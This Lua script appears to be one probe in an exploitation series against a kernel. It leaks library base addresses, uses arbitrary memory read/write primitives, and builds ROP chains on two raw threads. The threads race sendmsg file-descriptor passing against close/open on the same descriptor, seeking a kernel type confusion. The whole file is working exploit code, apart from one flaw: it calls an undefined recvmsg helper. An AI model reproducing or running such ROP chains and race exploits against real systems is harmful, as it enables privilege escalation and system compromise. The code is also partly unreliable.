-- CRASH_CLASS: HIGH
-- PROBE 534d: Parallel fd-close/sendmsg race via two child threads
--
-- Problem with 534c: Lua main loop is too slow, child finishes first.
-- Fix: BOTH threads run as ROP children for maximum speed.
-- Thread 1: sendmsg(SCM_RIGHTS, target_fd) in a loop (1000x)
-- Thread 2: close(target_fd) then open(devnull) to recycle the slot (1000x)
-- Main Lua: launches both, waits, checks results.
--
-- The open() after close() ensures the fd slot gets reused, increasing
-- the chance of type confusion if sendmsg races with close.

print("=== PROBE 534d: RACE PARALLEL ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end

local sc_mmap = make_syscall(477)
local sc_socketpair = make_syscall(135)
local sc_close = make_syscall(6)
local sc_nanosleep = make_syscall(240)
local sc_455 = make_syscall(455)
local sc_open = make_syscall(5)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax_ret = eb + uint64(0x992)
local pop_rdi_ret = eb + uint64(0xC9DFE)
local pop_rsi_ret = eb + uint64(0xD77D)
local pop_rdx_ret = eb + uint64(0x3B02D7)
local pop_rcx_ret = eb + uint64(0xE64)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local bare_ret = eb + uint64(0x42)
local fn_addr = lk + uint64(0xB57)

-- /dev/null path in memory
local devnull = memory.alloc(16)
zero(devnull, 16)
write_string(devnull, "/dev/null\0")

-- Transport + target socketpairs
local sv = memory.alloc(8)
zero(sv, 8)
pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
local tx_fd = rd(sv); local rx_fd = rd(sv + 4)
print("transport: tx=" .. tx_fd .. " rx=" .. rx_fd)

zero(sv, 8)
pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
local target_fd = rd(sv); local target_peer = rd(sv + 4)
print("target: fd=" .. target_fd .. " peer=" .. target_peer)

-- Shared results
local shared = memory.alloc(0x200)
zero(shared, 0x200)
-- shared+0x00: thread1 done counter
-- shared+0x04: thread1 send_ok count
-- shared+0x08: thread1 send_fail count
-- shared+0x80: thread2 done counter
-- shared+0x84: thread2 close_ok count
-- shared+0x88: thread2 open count

-- Pre-build sendmsg structures in persistent memory
-- msghdr for sendmsg(tx_fd, &msghdr, 0)
local iov_data = memory.alloc(8)
wq(iov_data, uint64(0x41))
local iov_s = memory.alloc(16)
wq(iov_s, uint64(iov_data)); wq(iov_s + 8, uint64(1))

-- cmsg with SCM_RIGHTS
local cmsg = memory.alloc(32); zero(cmsg, 32)
wd(cmsg, 16); wd(cmsg + 4, 0xFFFF); wd(cmsg + 8, 1); wd(cmsg + 12, target_fd)

local mhdr = memory.alloc(64); zero(mhdr, 64)
wq(mhdr + 0x10, uint64(iov_s)); wd(mhdr + 0x18, 1)
wq(mhdr + 0x20, uint64(cmsg)); wd(mhdr + 0x28, 24)

-- recvmsg structures (for draining)
local r_cmsg = memory.alloc(32)
local r_iov_d = memory.alloc(8)
local r_iov = memory.alloc(16); wq(r_iov, uint64(r_iov_d)); wq(r_iov + 8, uint64(8))
local r_mh = memory.alloc(64); zero(r_mh, 64)
wq(r_mh + 0x10, uint64(r_iov)); wd(r_mh + 0x18, 1)
wq(r_mh + 0x20, uint64(r_cmsg)); wd(r_mh + 0x28, 32)

-- TCBs
local function make_tcb()
    local ok_t, p = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    for toff = 0, 0x100, 8 do wq(p + toff, p) end
    local ptr = memory.alloc(8); wq(ptr, p)
    return ptr
end

local ITERS = 200

-- ===== THREAD 2: close(target_fd) + open("/dev/null") loop =====
-- This thread repeatedly closes the target fd and reopens /dev/null
-- to recycle the slot. The idea: if slot N gets recycled to a /dev/null
-- while thread 1 is mid-sendmsg, we get type confusion.
local t2_stack_size = 0x400000
local ok_s2, t2_stack = pcall(function()
    return sc_mmap(uint64(0), uint64(t2_stack_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local t2_tcb = make_tcb()
local t2_rsp = math.floor((to_num(t2_stack) + t2_stack_size) / 16) * 16 - 8

-- Build thread 2 chain
local t2_i = 0
local function t2_emit(v) wq(uint64(t2_rsp + t2_i), v); t2_i = t2_i + 8 end

-- sysarch
t2_emit(pop_rax_ret); t2_emit(uint64(165))
t2_emit(pop_rdi_ret); t2_emit(uint64(129))
t2_emit(pop_rsi_ret); t2_emit(t2_tcb)
t2_emit(fn_addr)

-- 200x: close(target_fd), open("/dev/null", O_RDWR), close(new_fd)
for iter = 0, ITERS - 1 do
    -- close(target_fd)
    t2_emit(pop_rax_ret); t2_emit(uint64(6))
    t2_emit(pop_rdi_ret); t2_emit(uint64(target_fd))
    t2_emit(fn_addr)

    -- open("/dev/null", O_RDWR=2, 0) → rax = new fd (hopefully = target_fd)
    t2_emit(pop_rax_ret); t2_emit(uint64(5))
    t2_emit(pop_rdi_ret); t2_emit(uint64(devnull))
    t2_emit(pop_rsi_ret); t2_emit(uint64(2))
    t2_emit(pop_rdx_ret); t2_emit(uint64(0))
    t2_emit(fn_addr)
    -- rax now has the new fd. Close it to free the slot for next iteration.
    -- But wait: we WANT the slot to stay occupied briefly so sendmsg sees it.
    -- Skip closing — let it accumulate. The kernel will assign the lowest free fd.
    -- Actually, after close(target_fd), the next open SHOULD get target_fd's slot.
    -- The new fd replaces it. Thread 1's sendmsg will pass target_fd number
    -- but the underlying file is now /dev/null → type confusion if sendmsg
    -- internalize the pointer before the type check.
end

-- Done marker
t2_emit(pop_rax_ret); t2_emit(uint64(ITERS))
t2_emit(pop_rdi_ret); t2_emit(shared + 0x80)
t2_emit(mov_rdi_rax_ret)

-- thr_exit
t2_emit(pop_rax_ret); t2_emit(uint64(431))
t2_emit(pop_rdi_ret); t2_emit(uint64(0))
t2_emit(fn_addr)

print("t2 chain: " .. t2_i .. " bytes")

-- ===== THREAD 1: sendmsg(SCM_RIGHTS) loop =====
local t1_stack_size = 0x400000
local ok_s1, t1_stack = pcall(function()
    return sc_mmap(uint64(0), uint64(t1_stack_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local t1_tcb = make_tcb()
local t1_rsp = math.floor((to_num(t1_stack) + t1_stack_size) / 16) * 16 - 8

local t1_i = 0
local function t1_emit(v) wq(uint64(t1_rsp + t1_i), v); t1_i = t1_i + 8 end

-- sysarch
t1_emit(pop_rax_ret); t1_emit(uint64(165))
t1_emit(pop_rdi_ret); t1_emit(uint64(129))
t1_emit(pop_rsi_ret); t1_emit(t1_tcb)
t1_emit(fn_addr)

-- 200x: sendmsg(tx_fd, &mhdr, 0)
-- sendmsg = sys 28, args: rdi=fd, rsi=msg, rdx=flags
for iter = 0, ITERS - 1 do
    t1_emit(pop_rax_ret); t1_emit(uint64(28))
    t1_emit(pop_rdi_ret); t1_emit(uint64(tx_fd))
    t1_emit(pop_rsi_ret); t1_emit(uint64(mhdr))
    t1_emit(pop_rdx_ret); t1_emit(uint64(0))
    t1_emit(fn_addr)
end

-- Done marker
t1_emit(pop_rax_ret); t1_emit(uint64(ITERS))
t1_emit(pop_rdi_ret); t1_emit(shared)
t1_emit(mov_rdi_rax_ret)

t1_emit(pop_rax_ret); t1_emit(uint64(431))
t1_emit(pop_rdi_ret); t1_emit(uint64(0))
t1_emit(fn_addr)

print("t1 chain: " .. t1_i .. " bytes")

-- Launch both threads
local tp1 = memory.alloc(0x40); zero(tp1, 0x40)
wq(tp1, bare_ret); wq(tp1 + 0x10, t1_stack); wq(tp1 + 0x18, uint64(t1_stack_size))

local tp2 = memory.alloc(0x40); zero(tp2, 0x40)
wq(tp2, bare_ret); wq(tp2 + 0x10, t2_stack); wq(tp2 + 0x18, uint64(t2_stack_size))

print("[LAUNCH]")
pcall(function() sc_455(uint64(tp1), uint64(0x38)) end)
pcall(function() sc_455(uint64(tp2), uint64(0x38)) end)

-- Wait for both
local ts = memory.alloc(16); wq(ts, uint64(2)); wq(ts + 8, uint64(0))
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

local t1_done = rd(shared)
local t2_done = rd(shared + 0x80)

print("")
print("[RESULTS]")
print("  t1(sendmsg): done=" .. (t1_done or "nil") .. "/" .. ITERS)
print("  t2(close+open): done=" .. (t2_done or "nil") .. "/" .. ITERS)

-- Drain rx_fd: how many messages arrived? Check for type confusion.
print("")
print("[DRAIN] Checking received fds:")
local drain_count = 0
local anomaly_count = 0
for d = 1, ITERS do
    zero(r_cmsg, 32); zero(r_mh, 64)
    wq(r_mh + 0x10, uint64(r_iov)); wd(r_mh + 0x18, 1)
    wq(r_mh + 0x20, uint64(r_cmsg)); wd(r_mh + 0x28, 32)
    local ok_r, rrv = pcall(function()
        return sc_recvmsg(uint64(rx_fd), uint64(r_mh), uint64(0x40)) -- MSG_DONTWAIT
    end)
    local rn = ok_r and to_num(rrv) or -999
    if rn < 0 then break end
    drain_count = drain_count + 1
    local rfd = rd(r_cmsg + 12)
    if rfd and rfd > 0 then
        -- fstat the received fd to check its type
        -- sys 189 = fstat, but simpler: just report the fd number
        if rfd ~= target_fd then
            anomaly_count = anomaly_count + 1
            if anomaly_count <= 10 then
                print(string.format("  msg %d: fd=%d (exp %d) *** DIFFERENT ***", d, rfd, target_fd))
            end
        end
        pcall(function() sc_close(uint64(rfd)) end)
    end
end
print("  drained=" .. drain_count .. " anomalies=" .. anomaly_count)

-- If no panic, try to detect if the process is still healthy
local ok_pid, pid = pcall(function() return make_syscall(20)() end)
print("  pid=" .. (ok_pid and to_num(pid) or "FAIL"))

pcall(function() sc_close(uint64(tx_fd)) end)
pcall(function() sc_close(uint64(rx_fd)) end)
pcall(function() sc_close(uint64(target_peer)) end)
print("=== 534d DONE ===")
